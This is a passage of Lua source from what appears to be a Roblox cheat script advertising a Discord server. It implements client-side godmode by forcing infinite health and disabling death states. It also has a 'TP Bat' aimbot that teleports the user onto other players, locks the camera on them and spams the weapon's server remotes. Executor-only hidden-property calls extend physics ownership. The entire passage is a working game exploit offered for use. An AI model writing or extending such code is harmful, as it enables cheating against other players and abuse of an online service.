        hum.BreakJointsOnDeath = false
        hum.RequiresNeck = false
        hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
        hum:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
        hum:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
        hum:SetStateEnabled(Enum.HumanoidStateType.Physics, false)
        hum.PlatformStand = false
        hum.Sit = false
    end)
    local root = char:FindFirstChild("HumanoidRootPart")
    if root then
        pcall(function()
            if root:CanSetNetworkOwnership() then
                root:SetNetworkOwner(player)
            end
        end)
    end
    if M._bypassGodHealthConn then pcall(function() M._bypassGodHealthConn:Disconnect() end) end
    M._bypassGodHealthConn = hum:GetPropertyChangedSignal("Health"):Connect(function()
        if not M.bypassAimbotEnabled then return end
        pcall(function()
            if hum.Health < (hum.MaxHealth or 100) or hum.Health <= 0 then
                hum.MaxHealth = math.huge
                hum.Health = math.huge
                hum.PlatformStand = false
                hum.Sit = false
                hum:ChangeState(Enum.HumanoidStateType.Running)
            end
        end)
    end)
    if M._bypassGodDiedConn then pcall(function() M._bypassGodDiedConn:Disconnect() end) end
    M._bypassGodDiedConn = hum.Died:Connect(function()
        if not M.bypassAimbotEnabled then return end
        -- stay alive client-side + recover from void
        pcall(function()
            hum.BreakJointsOnDeath = false
            hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
            hum.MaxHealth = math.huge
            hum.Health = math.huge
            hum.PlatformStand = false
            hum.Sit = false
            hum:ChangeState(Enum.HumanoidStateType.Running)
            local r = char:FindFirstChild("HumanoidRootPart")
            if r and M._bypassSafeRecoverCF then
                r.CFrame = M._bypassSafeRecoverCF(r)
                r.AssemblyLinearVelocity = Vector3.zero
                r.AssemblyAngularVelocity = Vector3.zero
            end
            task.defer(function()
                if not M.bypassAimbotEnabled then return end
                pcall(function()
                    hum.MaxHealth = math.huge
                    hum.Health = math.huge
                    hum:ChangeState(Enum.HumanoidStateType.Running)
                end)
            end)
        end)
    end)
    pcall(function()
        if M._bypassGodStateConn then pcall(function() M._bypassGodStateConn:Disconnect() end) end
        M._bypassGodStateConn = hum.StateChanged:Connect(function(_, new)
            if not M.bypassAimbotEnabled then return end
            if new == Enum.HumanoidStateType.Dead
                or new == Enum.HumanoidStateType.Ragdoll
                or new == Enum.HumanoidStateType.FallingDown
                or new == Enum.HumanoidStateType.Physics
                or new == Enum.HumanoidStateType.Flying then
                pcall(function()
                    hum.MaxHealth = math.huge
                    hum.Health = math.huge
                    hum.PlatformStand = false
                    hum.Sit = false
                    hum:ChangeState(Enum.HumanoidStateType.Running)
                end)
            end
        end)
    end)
end

-- ============================================================
-- ANTI DIE
-- ============================================================
function M._adClearConns()
    for _, key in ipairs({"_antiDieConn", "antiDieConn", "_antiDieCharConn", "_antiDieHealthConn", "_antiDieDiedConn", "_antiDieRenderConn", "_antiDieStateConn"}) do
        local c = M[key]
        if c then pcall(function() c:Disconnect() end); M[key] = nil end
    end
end

local function _adHarden(hum)
    if not hum then return end
    pcall(function() hum.BreakJointsOnDeath = false end)
    pcall(function() hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false) end)
    pcall(function() hum:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false) end)
    pcall(function() hum.RequiresNeck = false end)
end

function M._adProtectCharacter(char)
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum then return end
    pcall(function()
        _adHarden(hum)
        hum.MaxHealth = math.huge
        hum.Health = math.huge
        local st = hum:GetState()
        if hum.Health <= 0 then hum.Health = hum.MaxHealth end
        if st == Enum.HumanoidStateType.Dead or st == Enum.HumanoidStateType.Ragdoll then
            hum:ChangeState(Enum.HumanoidStateType.Running)
        end
    end)
    if M._antiDieHealthConn then pcall(function() M._antiDieHealthConn:Disconnect() end) end
    M._antiDieHealthConn = hum:GetPropertyChangedSignal("Health"):Connect(function()
        if not M.antiDieEnabled and not M.bypassAimbotEnabled and not M.autoBatEnabled then return end
        pcall(function()
            _adHarden(hum)
            if hum.Health < hum.MaxHealth or hum.Health <= 0 then
                hum.MaxHealth = math.huge
                hum.Health = math.huge
                hum.PlatformStand = false
                hum.Sit = false
            end
        end)
    end)
    if M._antiDieDiedConn then pcall(function() M._antiDieDiedConn:Disconnect() end) end
    M._antiDieDiedConn = hum.Died:Connect(function()
        if not M.antiDieEnabled and not M.bypassAimbotEnabled and not M.autoBatEnabled then return end
        pcall(function()
            _adHarden(hum)
            hum.MaxHealth = math.huge
            hum.Health = math.huge
            hum.PlatformStand = false
            hum.Sit = false
            hum:ChangeState(Enum.HumanoidStateType.Running)
            task.defer(function()
                if not M.antiDieEnabled and not M.bypassAimbotEnabled and not M.autoBatEnabled then return end
                pcall(function()
                    _adHarden(hum)
                    hum.MaxHealth = math.huge
                    hum.Health = math.huge
                    hum:ChangeState(Enum.HumanoidStateType.Running)
                end)
            end)
        end)
    end)
    if M._antiDieStateConn then pcall(function() M._antiDieStateConn:Disconnect() end) end
    M._antiDieStateConn = hum.StateChanged:Connect(function(_, new)
        if not M.antiDieEnabled and not M.bypassAimbotEnabled and not M.autoBatEnabled then return end
        if new == Enum.HumanoidStateType.Dead or new == Enum.HumanoidStateType.Ragdoll then
            pcall(function()
                _adHarden(hum)
                hum.MaxHealth = math.huge
                hum.Health = math.huge
                hum:ChangeState(Enum.HumanoidStateType.Running)
            end)
        end
    end)
end

function M.startAntiDie()
    -- CleanHub Anti-Die logic (math.huge health + block Dead state + floating billboard)
    if M._adClearConns then pcall(M._adClearConns) end
    M.antiDieEnabled = true
    M._antiDieDeathConns = M._antiDieDeathConns or {}

    local function destroyAdBillboard()
        if M._adBillboardUpdater then pcall(function() M._adBillboardUpdater:Disconnect() end); M._adBillboardUpdater = nil end
        if M._adBillboardGui then pcall(function() M._adBillboardGui:Destroy() end); M._adBillboardGui = nil end
    end
    M._destroyAdBillboard = destroyAdBillboard

    local function createAdBillboard(char)
        destroyAdBillboard()
        if not char then return end
        local head = char:FindFirstChild("Head")
        if not head then return end
        local sg = Instance.new("ScreenGui")
        sg.Name = "VynxAntiDieBillboard"
        sg.ResetOnSpawn = false
        sg.IgnoreGuiInset = true
        pcall(function() sg.Parent = game:GetService("CoreGui") end)
        if not sg.Parent then sg.Parent = player:WaitForChild("PlayerGui") end
        M._adBillboardGui = sg
        local fr = Instance.new("Frame", sg)
        fr.Size = UDim2.new(0, 200, 0, 60)
        fr.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        fr.BackgroundTransparency = 0.3
        fr.BorderSizePixel = 0
        Instance.new("UICorner", fr).CornerRadius = UDim.new(0, 8)
        local t1 = Instance.new("TextLabel", fr)
        t1.Size = UDim2.new(1, 0, 0.5, 0)
        t1.BackgroundTransparency = 1
        t1.Text = "ANTI DIE"
        t1.TextColor3 = Color3.fromRGB(255, 255, 255)
        t1.Font = Enum.Font.GothamBlack
        t1.TextSize = 20
        local t2 = Instance.new("TextLabel", fr)
        t2.Size = UDim2.new(1, 0, 0.5, 0)
        t2.Position = UDim2.new(0, 0, 0.5, 0)
        t2.BackgroundTransparency = 1
        t2.Text = "discord.gg/ximhub"
        t2.TextColor3 = Color3.fromRGB(255, 255, 255)
        t2.Font = Enum.Font.GothamBold
        t2.TextSize = 14
        M._adBillboardUpdater = RunService.Heartbeat:Connect(function()
            if not M.antiDieEnabled or not sg.Parent then destroyAdBillboard() return end
            if not head or not head.Parent then fr.Visible = false return end
            local cam = workspace.CurrentCamera
            if not cam then return end
            local pos, onScreen = cam:WorldToScreenPoint(head.Position)
            if onScreen then
                fr.Position = UDim2.new(0, pos.X - 100, 0, pos.Y - 40)
                fr.Visible = true
            else
                fr.Visible = false
            end
        end)
    end

    local function protectChar(char)
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid") or char:WaitForChild("Humanoid", 5)
        if not hum then return end
        pcall(function()
            hum.MaxHealth = math.huge
            hum.Health = math.huge
            hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
            hum.BreakJointsOnDeath = false
        end)
        for _, c in ipairs(M._antiDieDeathConns) do pcall(function() c:Disconnect() end) end
        M._antiDieDeathConns = {}
        table.insert(M._antiDieDeathConns, hum.StateChanged:Connect(function(_, new)
            if not M.antiDieEnabled then return end
            if new == Enum.HumanoidStateType.Dead then
                pcall(function()
                    hum.Health = math.huge
                    hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
                end)
            end
        end))
        table.insert(M._antiDieDeathConns, hum:GetPropertyChangedSignal("Health"):Connect(function()
            if not M.antiDieEnabled then return end
            if hum.Health < hum.MaxHealth then pcall(function() hum.Health = math.huge end) end
        end))
        if M.antiDieConn then pcall(function() M.antiDieConn:Disconnect() end) end
        M.antiDieConn = RunService.Heartbeat:Connect(function()
            if not M.antiDieEnabled then return end
            if hum and hum.Parent and hum.Health < hum.MaxHealth then
                pcall(function() hum.Health = math.huge end)
            end
        end)
        createAdBillboard(char)
    end
    M._adProtectCharacter = protectChar

    if player.Character then protectChar(player.Character) end
    if M._antiDieCharConn then pcall(function() M._antiDieCharConn:Disconnect() end) end
    M._antiDieCharConn = player.CharacterAdded:Connect(function(c)
        if not M.antiDieEnabled then return end
        task.wait(0.1)
        protectChar(c)
    end)
    if M.setAntiDieVisual then pcall(function() M.setAntiDieVisual(true) end) end
end

function M.stopAntiDie()
    M.antiDieEnabled = false
    if M._destroyAdBillboard then pcall(M._destroyAdBillboard) end
    if M._antiDieDeathConns then
        for _, c in ipairs(M._antiDieDeathConns) do pcall(function() c:Disconnect() end) end
        M._antiDieDeathConns = {}
    end
    pcall(function()
        local char = player.Character
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if hum then
            hum:SetStateEnabled(Enum.HumanoidStateType.Dead, true)
            hum.MaxHealth = 100
            if hum.Health > 100 then hum.Health = 100 end
        end
    end)
    M._adClearConns()
    if M._antiDieRenderConn then
        pcall(function() M._antiDieRenderConn:Disconnect() end)
        M._antiDieRenderConn = nil
    end
end

-- ============================================================
-- ANTI FLING / GLITCH DIE (global — not only aimbot)
-- Caps insane physics that often cause random death
-- ============================================================
M.antiFlingEnabled = true -- always default ON (stops fling deaths)
M.antiFlingMaxSpeed = M.antiFlingMaxSpeed or 120
M.antiFlingMaxY = M.antiFlingMaxY or 70
M.antiFlingMaxAng = M.antiFlingMaxAng or 25
M._antiFlingConn = nil

function M.startAntiFling()
    if M._antiFlingConn then
        pcall(function() M._antiFlingConn:Disconnect() end)
        M._antiFlingConn = nil
    end
    M.antiFlingEnabled = true
    M._antiFlingConn = RunService.Heartbeat:Connect(function()
        if not M.antiFlingEnabled then return end
        if M.bypassAimbotEnabled or M.dropActive then return end
        if M.dropActive then return end -- let drop fling work
        local char = player.Character
        if not char then return end
        local root = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not root then return end

        local cfgMax = math.max(tonumber(M.NS) or 60, tonumber(M.CS) or 30, tonumber(M.LAGGER_CARRY_SPEED) or 25)
        local maxSpd = math.max(tonumber(M.antiFlingMaxSpeed) or 140, cfgMax * 2.2, 200)
        local maxY = math.max(tonumber(M.antiFlingMaxY) or 90, 120)
        local maxAng = tonumber(M.antiFlingMaxAng) or 40

        pcall(function()
            local v = root.AssemblyLinearVelocity
            local bad = false
            if v.Magnitude > maxSpd or math.abs(v.Y) > maxY then
                root.AssemblyLinearVelocity = Vector3.new(
                    math.clamp(v.X, -maxSpd, maxSpd),
                    math.clamp(v.Y, -maxY, maxY),
                    math.clamp(v.Z, -maxSpd, maxSpd)
                )
                bad = true
            end
            local ang = root.AssemblyAngularVelocity
            if ang.Magnitude > maxAng then
                root.AssemblyAngularVelocity = Vector3.zero
                bad = true
            end
            -- Nan / inf guards (rare but lethal)
            if v ~= v or ang ~= ang then
                root.AssemblyLinearVelocity = Vector3.zero
                root.AssemblyAngularVelocity = Vector3.zero
                bad = true
            end
            if hum then
                if bad then
                    hum.PlatformStand = false
                    hum.Sit = false
                    pcall(function() hum:ChangeState(Enum.HumanoidStateType.Running) end)
                end
                local st = hum:GetState()
                if st == Enum.HumanoidStateType.Flying
                    or st == Enum.HumanoidStateType.Ragdoll
                    or st == Enum.HumanoidStateType.FallingDown
                    or st == Enum.HumanoidStateType.Physics then
                    if bad or v.Magnitude > maxSpd * 0.7 then
                        pcall(function()
                            hum:ChangeState(Enum.HumanoidStateType.Running)
                            hum.PlatformStand = false
                            hum.Sit = false
                        end)
                    end
                end
            end
        end)
    end)
end

function M.stopAntiFling()
    M.antiFlingEnabled = false
    if M._antiFlingConn then
        pcall(function() M._antiFlingConn:Disconnect() end)
        M._antiFlingConn = nil
    end
end



-- Keep Anti Die active while TP Bat (bypass) OR Auto Bat aimbot is on
function M.syncCombatAntiDie()
    local need = (M.bypassAimbotEnabled == true) or (M.autoBatEnabled == true)
    if need then
        M.antiDieEnabled = true
        if not M.antiDieConn then
            pcall(function() M.startAntiDie() end)
        end
        -- refresh protection on current char
        pcall(function()
            if player.Character then M._adProtectCharacter(player.Character) end
        end)
    else
        -- only stop when neither combat aim mode is active
        pcall(function() M.stopAntiDie() end)
    end
end

function M.enableBypassGodmode()
    -- Force Anti Die ON while TP Bat / Aimbot
    M.antiDieEnabled = true
    pcall(function()
        if M.startAntiDie then M.startAntiDie() end
        local char = player.Character
        if char and M._adProtectCharacter then M._adProtectCharacter(char) end
    end)
    M._bypassClearGodConns()
    local char = player.Character
    if char then M._bypassProtectCharacter(char) end
    M._bypassGodCharConn = player.CharacterAdded:Connect(function(c)
        if not M.bypassAimbotEnabled then return end
        task.wait(0.05)
        M._bypassProtectCharacter(c)
        pcall(function()
            if M._adProtectCharacter then M._adProtectCharacter(c) end
        end)
    end)
    -- Safe recover position (map spawn / last good / target)
    local function safeRecoverCF(root)
        local target = M._bypassTarget
        if target and target.Parent then
            local tp = target.Position
            if tp == tp and tp.Y > -10 and math.abs(tp.X) < 1e5 and math.abs(tp.Z) < 1e5 then
                return CFrame.new(tp.X, math.max(tp.Y, 8), tp.Z)
            end
        end
        if M._bypassLastGoodCF then
            local lp = M._bypassLastGoodCF.Position
            if lp == lp and lp.Y > -10 then
                return M._bypassLastGoodCF
            end
        end
        local sp = workspace:FindFirstChildOfClass("SpawnLocation")
        if sp then
            return CFrame.new(sp.Position + Vector3.new(0, 5, 0))
        end
        local p = root and root.Position or Vector3.new(0, 30, 0)
        return CFrame.new(p.X, 30, p.Z)
    end
    M._bypassSafeRecoverCF = safeRecoverCF

    -- ANTI-DIE + ANTI-VOID + ANTI-DESYNC while TP Bat ON
    M._bypassGodConn = RunService.Heartbeat:Connect(function()
        if not M.bypassAimbotEnabled then return end
        local char = player.Character
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        local root = char:FindFirstChild("HumanoidRootPart")
        if not hum then return end
        pcall(function()
            hum.BreakJointsOnDeath = false
            hum.RequiresNeck = false
            hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
            hum:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
            hum:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
            hum:SetStateEnabled(Enum.HumanoidStateType.Physics, false)
            hum.MaxHealth = math.huge
            if hum.Health < hum.MaxHealth or hum.Health <= 0 then
                hum.Health = math.huge
            end
            hum.PlatformStand = false
            hum.Sit = false
            local st = hum:GetState()
            if st == Enum.HumanoidStateType.Dead
                or st == Enum.HumanoidStateType.Ragdoll
                or st == Enum.HumanoidStateType.FallingDown
                or st == Enum.HumanoidStateType.Physics
                or st == Enum.HumanoidStateType.Flying then
                hum.Health = math.huge
                hum:ChangeState(Enum.HumanoidStateType.Running)
            end
            if root then
                local p = root.Position
                local v = root.AssemblyLinearVelocity
                local av = root.AssemblyAngularVelocity
                -- nan / inf velocity (desync / fling)
                if v ~= v or av ~= av or math.abs(v.X) > 1e6 or math.abs(v.Y) > 1e6 or math.abs(v.Z) > 1e6 then
                    root.AssemblyLinearVelocity = Vector3.zero
                    root.AssemblyAngularVelocity = Vector3.zero
                end
                -- hard velocity clamp while TP bat (anti desync pull)
                if v.Magnitude > 280 or math.abs(v.Y) > 160 then
                    root.AssemblyLinearVelocity = Vector3.new(
                        math.clamp(v.X, -120, 120),
                        math.clamp(v.Y, -80, 80),
                        math.clamp(v.Z, -120, 120)
                    )
                end
                if av.Magnitude > 25 then
                    root.AssemblyAngularVelocity = Vector3.zero
                end
                -- void / out-of-bounds / nan position → recover to target or last good
                local inVoid = (p.Y < -20) or (p ~= p)
                    or math.abs(p.X) > 5e4 or math.abs(p.Z) > 5e4
                    or math.abs(p.Y) > 5e4
                if inVoid then
                    local cf = safeRecoverCF(root)
                    root.CFrame = cf
                    root.AssemblyLinearVelocity = Vector3.zero
                    root.AssemblyAngularVelocity = Vector3.zero
                    hum.Health = math.huge
                    hum.PlatformStand = false
                    hum.Sit = false
                    hum:ChangeState(Enum.HumanoidStateType.Running)
                else
                    -- remember last good ground-ish pose for recover
                    if p.Y > 0 and p.Y < 500 then
                        M._bypassLastGoodCF = root.CFrame
                    end
                end
                -- keep network ownership local when possible (anti server pull / desync)
                pcall(function()
                    if root:CanSetNetworkOwnership() then
                        root:SetNetworkOwner(player)
                    end
                end)
                pcall(function()
                    if sethiddenproperty then
                        sethiddenproperty(player, "MaxSimulationRadius", 1e5)
                        sethiddenproperty(player, "SimulationRadius", 1e5)
                    end
                end)
            end
        end)
    end)
end

function M.disableBypassGodmode()
    M._bypassClearGodConns()
end

function M.startBypassAimbot()
    -- TP Bat / Aimbot: all directions + prediction + multi-hit (toggle stays ON until user offs it)
    if M.safeModeTryStart and not M.safeModeTryStart() then return end
    if M.bypassAimbotConn then pcall(function() M.bypassAimbotConn:Disconnect() end); M.bypassAimbotConn = nil end
    if M._bypassRenderConn then pcall(function() M._bypassRenderConn:Disconnect() end); M._bypassRenderConn = nil end
    if M._aimbotEquipThread then pcall(function() task.cancel(M._aimbotEquipThread) end); M._aimbotEquipThread = nil end

    pcall(function()
        if M.pingActive and M.setPingActive then M.setPingActive(false, true) end
    end)
    M.autoSwingEnabled = true
    M.tpBatAutoSwing = true

    if M.autoLeftEnabled then
        M.autoLeftEnabled = false
        if M.autoLeftSetVisual then M.autoLeftSetVisual(false) end
        pcall(function() M.stopAutoLeft() end)
    end
    if M.autoRightEnabled then
        M.autoRightEnabled = false
        if M.autoRightSetVisual then M.autoRightSetVisual(false) end
        pcall(function() M.stopAutoRight() end)
    end
    M._autoTPWasEnabledForBypass = false
    if M.autoTPEnabled then
        M._autoTPWasEnabledForBypass = true
        pcall(function() M.stopAutoTP() end)
        if M.setAutoTPVisual then M.setAutoTPVisual(false) end
    end

    M.bypassAimbotEnabled = true
    M._antiDieBeforeBat = M.antiDieEnabled == true
    M.antiDieEnabled = true
    pcall(function()
        if M.startAntiDie then M.startAntiDie() end
        if player.Character and M._adProtectCharacter then M._adProtectCharacter(player.Character) end
    end)
    pcall(function() if M.enableBypassGodmode then M.enableBypassGodmode() end end)
    M._sureHitCD = false
    M._aimStickyTr = nil
    M._aimStickyUntil = 0
    M._aimVelCache = {}
    M._aimAccCache = {}
    M._aimPrevTick = {}

    -- Auto Shift Lock ON while TP Bat active
    pcall(function()
        M._prevMouseBehavior = UIS.MouseBehavior
        M._prevMouseIcon = UIS.MouseIconEnabled
        M._prevCamMode = player.CameraMode
        player.CameraMode = Enum.CameraMode.Classic
        UIS.MouseBehavior = Enum.MouseBehavior.LockCenter
        UIS.MouseIconEnabled = false
        local char = player.Character
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if hum then
            M._prevCamOffset = hum.CameraOffset
            hum.CameraOffset = Vector3.new(1.75, 0, 0)
        end
        if M._shiftLockKeepConn then M._shiftLockKeepConn:Disconnect() end
        M._shiftLockKeepConn = RunService.RenderStepped:Connect(function()
            if not M.bypassAimbotEnabled then return end
            if UIS.MouseBehavior ~= Enum.MouseBehavior.LockCenter then
                UIS.MouseBehavior = Enum.MouseBehavior.LockCenter
            end
            UIS.MouseIconEnabled = false
        end)
    end)

    local char0 = player.Character
    if char0 then
        M._bypassHRP = char0:FindFirstChild("HumanoidRootPart")
        M._bypassHum = char0:FindFirstChildOfClass("Humanoid")
        if M._bypassHum then
            M.bypassPrevAutoRotate = M._bypassHum.AutoRotate
            M._bypassHum.AutoRotate = false
        end
    end

    local RANGE = tonumber(M.AIMBOT_RANGE) or 175
    local TP_HARD = 5.5
    local TP_SOFT = 2.6
    local HIT_CD = 0.045
    local STICKY = 1.6

    local function equipBat()
        local c = player.Character
        if not c then return nil end
        local hm = c:FindFirstChildOfClass("Humanoid")
        local bat = M._bypassFindBat and M._bypassFindBat() or nil
        if not bat then
            for _, v in ipairs(c:GetChildren()) do
                if v:IsA("Tool") then
                    local n = string.lower(v.Name)
                    if n == "bat" or n:find("bat", 1, true) then bat = v; break end
                end
            end
        end
        if not bat then
            local bp = player:FindFirstChild("Backpack")
            if bp and hm then
                for _, v in ipairs(bp:GetChildren()) do
                    if v:IsA("Tool") then
                        local n = string.lower(v.Name)
                        if n == "bat" or n:find("bat", 1, true) then
                            pcall(function() hm:EquipTool(v) end)
                            bat = v
                            break
                        end
                    end
                end
            end
        end
        return bat
    end

    local function tryHit()
        if M.perfectHitEnabled == false and M.tpBatSureHitEnabled == false then return end
        if M._sureHitCD then return end
        M._sureHitCD = true
        pcall(function()
            local bat = equipBat()
            if not bat then return end
            for _ = 1, 3 do
                pcall(function() bat:Activate() end)
                local ev = bat:FindFirstChildWhichIsA("RemoteEvent")
                if ev then pcall(function() ev:FireServer() end) end
                local rf = bat:FindFirstChildWhichIsA("RemoteFunction")
                if rf then pcall(function() rf:InvokeServer() end) end
            end
        end)
        task.delay(HIT_CD, function() M._sureHitCD = false end)
    end

    local function getTarget(root)
        local now = tick()
        -- sticky any direction
        if M._aimStickyTr and M._aimStickyTr.Parent and now < (M._aimStickyUntil or 0) then
            local hum = M._aimStickyTr.Parent:FindFirstChildOfClass("Humanoid")
            if hum and hum.Health > 0 then
                local d = (root.Position - M._aimStickyTr.Position).Magnitude
                if d <= RANGE * 1.3 then
                    return M._aimStickyTr, d
                end
            end
            M._aimStickyTr = nil
        end

        local best, bestDist = nil, math.huge
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= player and plr.Character then
                local tr = plr.Character:FindFirstChild("HumanoidRootPart")
                local hum = plr.Character:FindFirstChildOfClass("Humanoid")
                if tr and hum and hum.Health > 0 then
                    local dist = (root.Position - tr.Position).Magnitude
                    if dist < bestDist and dist <= RANGE then
                        bestDist = dist
                        best = tr
                    end
                end
            end
        end
        if best then
            M._aimStickyTr = best
            M._aimStickyUntil = now + STICKY
            return best, bestDist
        end
        return nil, math.huge
    end

    local function predictedPos(tr)
        local now = tick()
        local vel = tr.AssemblyLinearVelocity or Vector3.zero
        local prevV = M._aimVelCache[tr]
        local prevT = M._aimPrevTick[tr] or now
        local dt = math.clamp(now - prevT, 1/240, 0.12)
        local rawAcc = prevV and ((vel - prevV) / dt) or Vector3.zero
        local smV = prevV and prevV:Lerp(vel, 0.55) or vel
        local prevA = M._aimAccCache[tr]
        local smA = prevA and prevA:Lerp(rawAcc, 0.35) or rawAcc
        if smA.Magnitude > 120 then smA = smA.Unit * 120 end
        M._aimVelCache[tr] = smV
        M._aimAccCache[tr] = smA
        M._aimPrevTick[tr] = now
        local flatV = Vector3.new(smV.X, 0, smV.Z)
        local flatA = Vector3.new(smA.X, 0, smA.Z)
        local hrp = M._bypassHRP
        local dist = hrp and (hrp.Position - tr.Position).Magnitude or 10
        local tPred = math.clamp(dist / 90, 0.06, 0.22)
        return tr.Position + flatV * tPred + flatA * (0.5 * tPred * tPred) + Vector3.new(0, 0.9, 0)
    end

    local function chase()
        if not M.bypassAimbotEnabled then return end
        local char = player.Character
        if not char then return end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hrp or not hum then return end
        -- ANTI DIE while TP Bat / Aimbot (never stop on death)
        pcall(function()
            _adHarden(hum)
            local st = hum:GetState()
            if hum.Health <= 0 then
                hum.MaxHealth = math.huge
                hum.Health = math.huge
            end
            if st == Enum.HumanoidStateType.Dead or st == Enum.HumanoidStateType.Ragdoll then
                hum:ChangeState(Enum.HumanoidStateType.Running)
            end
            hum.PlatformStand = false
            hum.Sit = false
        end)
        if hum.PlatformStand then pcall(function() hum.PlatformStand = false end) end
        -- fling recovery after death/hit
        pcall(function()
            local lv = hrp.AssemblyLinearVelocity
            local av = hrp.AssemblyAngularVelocity
            if lv.Magnitude > 250 then hrp.AssemblyLinearVelocity = Vector3.zero end
            if av.Magnitude > 20 then hrp.AssemblyAngularVelocity = Vector3.zero end
        end)
        M._bypassHRP, M._bypassHum = hrp, hum
        hum.AutoRotate = false

        local target, dist = getTarget(hrp)
        if not target then
            M._bypassTarget = nil
            return
        end
        M._bypassTarget = target

        if sethiddenproperty then
            pcall(function() sethiddenproperty(hrp, "PhysicsRepRootPart", target) end)
        end

        local aimPos = predictedPos(target)
        local gap = (hrp.Position - aimPos).Magnitude

        if gap > TP_HARD then
            hrp.CFrame = CFrame.new(aimPos)
            hrp.AssemblyLinearVelocity = Vector3.zero
            hrp.AssemblyAngularVelocity = Vector3.zero
        elseif gap > TP_SOFT then
            local dir = aimPos - hrp.Position
            if dir.Magnitude > 0.05 then
                local step = dir.Unit * math.min(gap, 5.5)
                local np = hrp.Position + step
                hrp.CFrame = CFrame.new(np, Vector3.new(target.Position.X, np.Y, target.Position.Z))
                hrp.AssemblyLinearVelocity = Vector3.zero
                hrp.AssemblyAngularVelocity = Vector3.zero
            end
        else
            hrp.CFrame = CFrame.new(hrp.Position, Vector3.new(target.Position.X, hrp.Position.Y, target.Position.Z))
            hrp.AssemblyAngularVelocity = Vector3.zero
        end

        local cam = workspace.CurrentCamera
        if cam then
            cam.CFrame = CFrame.new(cam.CFrame.Position, target.Position + Vector3.new(0, 0.4, 0))
        end
        tryHit()
    end

    M.bypassAimbotConn = RunService.Heartbeat:Connect(chase)
    M._bypassRenderConn = RunService.RenderStepped:Connect(function()
        if not M.bypassAimbotEnabled then return end
        local target = M._bypassTarget
        if not (target and target.Parent) then return end
        local cam = workspace.CurrentCamera
        if cam then
            cam.CFrame = CFrame.new(cam.CFrame.Position, target.Position + Vector3.new(0, 0.4, 0))
        end
        local hrp = M._bypassHRP
        if hrp and (hrp.Position - target.Position).Magnitude <= 9 then
            tryHit()
        end
    end)

    M._aimbotEquipThread = task.spawn(function()
        while M.bypassAimbotEnabled do
            pcall(equipBat)
            task.wait(0.25)
        end
    end)

    -- Character respawn: KEEP TP bat ON (do not turn off)
    if M._bypassBatCharConn then pcall(function() M._bypassBatCharConn:Disconnect() end) end
    M._bypassBatCharConn = player.CharacterAdded:Connect(function(char)
        if not M.bypassAimbotEnabled then return end
        task.wait(0.2)
        M._bypassHRP = char:FindFirstChild("HumanoidRootPart") or char:WaitForChild("HumanoidRootPart", 3)
        M._bypassHum = char:FindFirstChildOfClass("Humanoid")
        pcall(function()
            if M._bypassHRP then
                M._bypassHRP.AssemblyLinearVelocity = Vector3.zero
                M._bypassHRP.AssemblyAngularVelocity = Vector3.zero
            end
            if M._bypassHum then
                M.bypassPrevAutoRotate = M._bypassHum.AutoRotate
                M._bypassHum.AutoRotate = false
                M._bypassHum.PlatformStand = false
            end
        end)
        M.antiDieEnabled = true
        pcall(function()
            if M.startAntiDie then M.startAntiDie() end
            if M._adProtectCharacter then M._adProtectCharacter(char) end
            if M.enableBypassGodmode then M.enableBypassGodmode() end
        end)
        -- re-equip bat after respawn
        task.delay(0.35, function()
            if not M.bypassAimbotEnabled then return end
            pcall(function()
                local hm = char:FindFirstChildOfClass("Humanoid")
                local bat = M._bypassFindBat and M._bypassFindBat() or nil
                if hm and bat then hm:EquipTool(bat) end
            end)
        end)
        if M.setBypassVisual then pcall(function() M.setBypassVisual(true) end) end
        if M.mobBtnRefs and M.mobBtnRefs.bypass then pcall(function() M.mobBtnRefs.bypass(true) end) end
    end)

    if M.setBypassVisual then pcall(function() M.setBypassVisual(true) end) end
    if M.mobBtnRefs and M.mobBtnRefs.bypass then pcall(function() M.mobBtnRefs.bypass(true) end) end
end

function M.stopBypassAimbot()
    -- Restore mouse / shift lock
    pcall(function()
        if M._shiftLockKeepConn then
            M._shiftLockKeepConn:Disconnect()
            M._shiftLockKeepConn = nil
        end
        if M._prevMouseBehavior ~= nil then
            UIS.MouseBehavior = M._prevMouseBehavior
        else
            UIS.MouseBehavior = Enum.MouseBehavior.Default
        end
        if M._prevMouseIcon ~= nil then
            UIS.MouseIconEnabled = M._prevMouseIcon
        else
            UIS.MouseIconEnabled = true
        end
        if M._prevCamMode ~= nil then
            player.CameraMode = M._prevCamMode
        end
        local char = player.Character
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if hum and M._prevCamOffset ~= nil then
            hum.CameraOffset = M._prevCamOffset
        elseif hum then
            hum.CameraOffset = Vector3.zero
        end
        M._prevMouseBehavior = nil
        M._prevMouseIcon = nil
        M._prevCamMode = nil
        M._prevCamOffset = nil
    end)
    if M._bypassBatCharConn then pcall(function() M._bypassBatCharConn:Disconnect() end); M._bypassBatCharConn = nil end
    pcall(function()
        local c = player.Character
        local h = c and c:FindFirstChildOfClass("Humanoid")
        if h and M.bypassPrevAutoRotate ~= nil then h.AutoRotate = M.bypassPrevAutoRotate end
    end)
    if M._aimbotEquipThread then pcall(function() task.cancel(M._aimbotEquipThread) end); M._aimbotEquipThread = nil end
    pcall(function() local c=player.Character; local h=c and c:FindFirstChildOfClass("Humanoid"); if h then h.PlatformStand=false end end)
    if M.bypassAimbotConn then
        pcall(function() M.bypassAimbotConn:Disconnect() end)
        M.bypassAimbotConn = nil
    end
    if M._bypassRenderConn then
